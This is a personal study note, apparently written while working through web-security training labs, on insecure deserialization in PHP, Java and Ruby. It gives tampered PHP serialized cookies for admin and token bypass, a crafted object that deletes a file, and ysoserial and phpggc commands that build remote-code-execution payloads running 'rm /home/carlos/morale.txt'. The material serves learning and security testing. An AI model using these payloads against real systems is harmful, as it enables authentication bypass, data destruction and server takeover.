# insecureDeserialization
# serialization

*Serialization* is the process of converting complex data structures, such as
objects and their fields, into a "flatter" format that can be sent and received
as a sequential stream of bytes.

# deserialization

Deserialization is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized.

Many programming languages offer native support for serialization

# Insecure deserialization

when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.

why it is also called *object injection* vulnerability?

because it is possible to replace a serialized object with an object of an
entirely different class.

## how it happens?

sometimes website validate serialized user data after deserialization which is fundamentally wrong.

developers might not understand that attackers could manipulate binary serialized objects.

if an attacker is able to chain together a long series of unexpected method
invocations, passing data into a sink that is completely unrelated to the
initial source.


## How to identify insecure deserialization

look in the input data and identity anything that looks like serialized data

to find them, you should be familiar with the formant that different languages
use.

### PHP serialization format

Normal form:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

deserialized form:

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

php uses `serialize()` and `unserialize()`.

### JAVA

serialized Java objects always begin with the same bytes, which are encoded as
`aced` in hexadecimal and `rO0` in `Base64`.

Any class that implements the interface `java.io.Serializable` can be serialized
and deserialized.

take note of any code that uses the `readObject()` method, which is used to read
and deserialize data from an `InputStream`.

## Manipulating serialized objects

you can study the serialized data to identify and edit interesting attribute values.

then pass the malicious object into the website via its deserialization process.

You can either:

* edit the object directly in its byte stream form
* write a short script in the corresponding language to create and serialize
  the new object

### modifying object attributes

as long as the attacker preserves a valid serialized object, the
deserialization process will create a server-side object with the modified
attribute values.

there might be an serialized object which could be decoded to this by the attacker:

```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

clearly the `isAdmin` attribute is vulnerable

a session cookie could contain this serialized object and we can manipulate it to log in as admin.

### Modifying data types

all true:

```php
5 == "5"              // converts string to integer
5 == "5 of something" // starts with 5
0 == "Example string" // there are 0 numerals in the string
```

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

As long as the stored password does not start with a number, the condition would always return true

in this case, the password is sent as `COOKIE` in thee serialized form, so the password
could be passed as integer. if it was fetched directly from the request (say it's body), it
would have been converted to a string.

we can change `s:6:"wiener";s:12:"access_token";s:32:"f7eshq71rc1iealszqa2bbntaius8b2o";`
into `s:13:"administrator";s:12:"access_token";i:0;`
and bypass the authentication.

#### how to do deserialization in php:

```php
<?php
$serialized = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kp8zn3zwmbvxdiwrp4jy0e7m84ts65ii";}%3d%3d';
$decoded = urldecode($serialized);
$user = unserialize($decoded);
print_r($user);
?>
```

#### how admin panel works:

`GET /admin/delete?username=carlos HTTP/2`

### using application functionality

data in a deserialized object could be used for certain functionalities that could be
exploited by injecting unexpected data.

if the application is doing something, (like deleting a user) and as part of this it does
other stuff (like deleting the user's picture) and uses a serialized object, the object
could be manipulated to exploit the app's functionalities (like deleting some other file).

`O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"cehh0xccwfikt12r5htmsz3vpi6cgp69";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`

* be careful to use the absolute path to be sure: `/home/carlos/morale.txt`

## magic methods

a common feature of OOP, indicated by double-underscore.
they are invoked automatically whenever an event or scenario happens;e.g. deserialization.

in php, `__construct()` is invoked whenever an object of the class is instantiated, similar
to Python's `__init__`. they contain code to initialize the attributes for the instance but
can be customized to execute any code.

they can become dangerous when the code handles attacker-controlled data.

PHP's `unserialize()` method, invokes and object's `__wakeup()` magic method *during* the
deserialization process. Java's `ObjectInputStream.readObject()` and `readObject()` could
also be used for that.

these objects allow you to pass data from a serialized object into the website's code before
the object is fully deserialized.


## injecting arbitrary objects

a class determines what methods are available to it's object. if the class type could be
manipulated, so the methods and codes that will be executed, after or during
deserialization.

Deserialization methods do not typically check what they are deserializing, so you could
pass any serializable class that is available to the website.

This allows an attacker to create instances of arbitrary classes. The fact that this object
is not of the expected class does not matter. The unexpected object type might cause an
exception in the application logic, but the malicious object will already be instantiated by
then.

the idea is to find a class with deserialized magic methods that perform dangerous
operations, then by sending a serialized object of this class, the method will be executed.

#tip: don't just focus on requests, take a look at site map and find out where are the page
referencing.

#tip: get the source code by adding `~`: `GET /libs/CustomTemplate.php~ HTTP/2`
#tip: PHP delete = `unlink()`

```php
class CustomTemplate {
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->lock_file_path = $template_file_path;
    }
    
    
    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

$logger = new CustomTemplate("/home/carlos/morale.txt");
echo base64_encode(serialize($logger));
```

it could be done in multiple ways.
I removed most of the stuff but still this worked. it seems that I should've kept the private
variables and the whole structure of the class untouched.

## gadget chains

A "gadget" is a snippet of code that exists in the application that can help an attacker to
achieve a particular goal.

a gadget might not do anything harmful with the attacker's data but pass it into another
potentially harmful one. this way the attacker can chain gadget together to reach a *sink
gadget*.

the code already exists in the application, the attacker passes the data typically using a
*magic method* sometimes known as a "kick-off gadget".

most of the insecure deserialization vulnerabilities will only be exploitable through the
use of gadget chains.

### working with pre-built gadget chains

almost impossible without source code access. but:

#### doing it without source code access

there are tools with pre-discovered chains, successfully exploited on other websites.
this is because many website use the same library, if one is effected, others might.

`ysoseril`: what library the target is using? choose a chain for that. then pass it a code
to execute.


```sh
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
     --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
     --add-opens=java.base/java.net=ALL-UNNAMED \
     --add-opens=java.base/java.util=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt'
```

this tool could also be used to detect insecure deserialization, using `URLDNS` and
`JRMPClient` chains.

# phpgcc

used a script to generate all payloads and then passed it to burp intruder

* methodology maters, you should first check the cookie to see what it might include; e.g.
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJrdjdnOThtMTVlcWJ0aWY3cjF2MDB6aXZjbnNvZmlobSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22c0e068d4c1e822a9c26395e0e47fc159260f568c%22%7D

this cookie is sined by sha1 hmac hash.

and if we send our modified cookie, it wont work:

```html
<h4>Internal Server Error: Symfony Version: 4.3.6</h4>
 <p class=is-warning>PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7</p>
```

we need more info on 2 

#tip: developer comments could be useful.

in this case it leaks a debug file, which we use to find a `SECRETE_KEY` for the HMAC.
there is an script for this in `scripts/hash`

how to use `phpggc`:

```sh
./phpggc/phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
```

# for fuck sake, use `-w0` with base64 so it won't insert a new line and fuck everything.

#tip check the http header, specially cookies

#tip check the code using inspect element

#tip If you come across a base64 encoded parameter which does not seem to return anything
more than a binary blob, always make sure to try some common encodings and decompression on
it to see if there is something interesting actually there. The Burp Suite extension
Hackvertor is a great tool to do this as it has many built-in encoding and compression
algorithms.

#tip After two rounds of URL decoding and one round of Base64 decoding, I had what appeared
to be a serialized Java payload. This was apparent from the magic number, which is `rO0` in
ASCII or AC ED 00 in hex

## Working with documented gadget chains

the gadget chains might exists but not in a dedicated tool, you should search for online
documents and do the rest yourself (tweaking the code and serializing).

for this one I used `onlinegdb.com/online_ruby_compiler` which seems to run an older venison
of ruby.


related blog posts:
https://rhinosecuritylabs.com/research/java-deserializationusing-ysoserial/
https://coalfire.com/the-coalfire-blog/exploiting-blind-java-deserialization
https://securitycafe.ro/2017/11/03/tricking-java-serialization-for-a-treat/
https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef
https://www.elttam.com/blog/ruby-deserialization/
https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

examples:

[[natas#33]]